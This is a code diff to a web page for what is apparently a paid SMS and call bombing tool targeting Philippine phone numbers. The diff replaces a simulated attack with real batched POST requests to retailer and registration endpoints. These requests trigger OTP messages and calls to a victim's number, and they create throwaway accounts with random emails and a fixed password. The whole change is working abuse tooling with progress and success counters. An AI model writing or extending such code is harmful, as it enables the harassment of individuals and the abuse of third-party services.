@@ -115,7 +115,7 @@
                         <input 
                             type="number" 
                             id="batch-amount" 
-                            value="10"
+                            value="5"
                             min="1"
                             max="50"
                             class="input-field w-full p-3 rounded"
@@ -161,9 +161,12 @@
                     </div>
                 </div>
 
-                <button onclick="stopAttack()" class="btn-danger w-full mt-4 p-2 rounded">
-                    ⏹️ STOP ATTACK
-                </button>
+                <div class="mt-4 text-center">
+                    <div id="current-batch" class="text-sm text-gray-400 mb-2">Preparing attack...</div>
+                    <button onclick="stopAttack()" class="btn-danger w-full p-2 rounded">
+                        ⏹️ STOP ATTACK
+                    </button>
+                </div>
             </div>
 
             <!-- Results -->
@@ -172,6 +175,10 @@
                 <div class="text-center">
                     <div class="text-2xl font-bold text-green-400 mb-2" id="total-requests">0</div>
                     <div class="text-sm text-gray-400">Total requests sent</div>
+                    <div class="mt-2 text-sm">
+                        <span class="text-green-400">✓ <span id="result-success">0</span> success</span> | 
+                        <span class="text-red-400">✗ <span id="result-fail">0</span> failed</span>
+                    </div>
                 </div>
             </div>
 
@@ -202,6 +209,8 @@
         let selectedServices = Object.keys(API_ENDPOINTS_MAP);
         let isAttacking = false;
         let attackStats = { success: 0, failed: 0 };
+        let currentBatch = 0;
+        let totalBatches = 0;
 
         // Key Validation
         async function validateKey() {
@@ -272,6 +281,78 @@
             renderServices();
         }
 
+        // Normalize phone number
+        function normalizePhoneNumber(phone) {
+            phone = phone.trim().replace(/[^0-9+]/g, '');
+            if (phone.startsWith('+639') && phone.length === 13) return phone;
+            if (phone.startsWith('639') && phone.length === 12) return '+' + phone;
+            if (phone.startsWith('09') && phone.length === 11) return '+63' + phone.substring(1);
+            if (phone.startsWith('9') && phone.length === 10) return '+63' + phone;
+            return null;
+        }
+
+        // Random string generator
+        function randomString(length) {
+            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        // Make API request
+        async function makeApiRequest(service, phoneNumber) {
+            const url = API_ENDPOINTS_MAP[service];
+            const normalizedPhone = normalizePhoneNumber(phoneNumber);
+            
+            if (!normalizedPhone) {
+                return false;
+            }
+
+            try {
+                const options = {
+                    method: 'POST',
+                    signal: AbortSignal.timeout(10000),
+                    headers: {}
+                };
+
+                // Different payloads for different services
+                switch(service) {
+                    case "XPRESS":
+                        options.headers = { 'Content-Type': 'application/json' };
+                        options.body = JSON.stringify({
+                            FirstName: "Test",
+                            LastName: "User",
+                            Email: `test${randomString(8)}@gmail.com`,
+                            Phone: normalizedPhone,
+                            Password: "Password123",
+                            ConfirmPassword: "Password123"
+                        });
+                        break;
+                    case "ABENSON":
+                        options.headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
+                        options.body = `contact_no=${normalizedPhone.replace('+63', '')}&login_token=undefined`;
+                        break;
+                    case "CALL_BOMB":
+                        options.headers = { 'Content-Type': 'application/json' };
+                        options.body = JSON.stringify({ phone: normalizedPhone });
+                        break;
+                    default:
+                        // Basic JSON payload for other services
+                        options.headers = { 'Content-Type': 'application/json' };
+                        options.body = JSON.stringify({ phone: normalizedPhone });
+                }
+
+                const response = await fetch(url, options);
+                return response.status >= 200 && response.status < 300;
+                
+            } catch (error) {
+                console.error(`API call failed for ${service}:`, error);
+                return false;
+            }
+        }
+
         // Attack Functions
         async function startAttack() {
             if (isAttacking) return;
@@ -289,32 +370,53 @@
                 return;
             }
 
+            // Validate phone number
+            const normalizedPhone = normalizePhoneNumber(target);
+            if (!normalizedPhone) {
+                alert('❌ Invalid phone number format. Use: 09xx, 639xx, or +639xx');
+                return;
+            }
+
             // Start attack
             isAttacking = true;
             attackStats = { success: 0, failed: 0 };
+            currentBatch = 0;
+            totalBatches = batches;
             
-            document.getElementById('attack-configuration').classList.add('hidden');
+            // Show progress UI
             document.getElementById('attack-progress').classList.remove('hidden');
             document.getElementById('attack-results').classList.add('hidden');
             document.getElementById('start-button').disabled = true;
             
             updateProgress(0, batches);
             
-            // Simulate attack (replace with real API calls)
+            // Execute attack batches
             for (let i = 1; i <= batches && isAttacking; i++) {
-                // Simulate API calls
-                const batchSuccess = Math.floor(Math.random() * selectedServices.length * 0.7);
-                const batchFail = selectedServices.length - batchSuccess;
+                currentBatch = i;
+                document.getElementById('current-batch').textContent = `Batch ${i} of ${batches} - Sending ${selectedServices.length} requests...`;
                 
-                attackStats.success += batchSuccess;
-                attackStats.failed += batchFail;
+                // Make API calls for all selected services
+                const requests = selectedServices.map(service => 
+                    makeApiRequest(service, target)
+                );
+                
+                const results = await Promise.all(requests);
+                
+                // Update stats
+                results.forEach(success => {
+                    if (success) {
+                        attackStats.success++;
+                    } else {
+                        attackStats.failed++;
+                    }
+                });
                 
                 updateProgress(i, batches);
                 
                 // Track usage
                 await trackUsage(selectedServices.length);
                 
-                // Delay between batches
+                // Delay between batches (2 seconds)
                 if (i < batches && isAttacking) {
                     await new Promise(resolve => setTimeout(resolve, 2000));
                 }
@@ -326,14 +428,17 @@
             document.getElementById('attack-results').classList.remove('hidden');
             document.getElementById('start-button').disabled = false;
             
+            // Show results
             document.getElementById('total-requests').textContent = attackStats.success + attackStats.failed;
+            document.getElementById('result-success').textContent = attackStats.success;
+            document.getElementById('result-fail').textContent = attackStats.failed;
         }
 
         function stopAttack() {
             isAttacking = false;
             document.getElementById('attack-progress').classList.add('hidden');
-            document.getElementById('attack-configuration').classList.remove('hidden');
             document.getElementById('start-button').disabled = false;
+            document.getElementById('current-batch').textContent = 'Attack stopped by user';
         }
 
         function updateProgress(current, total) {
@@ -383,4 +488,4 @@
         });
     </script>
 </body>
-  </html>
+</html>
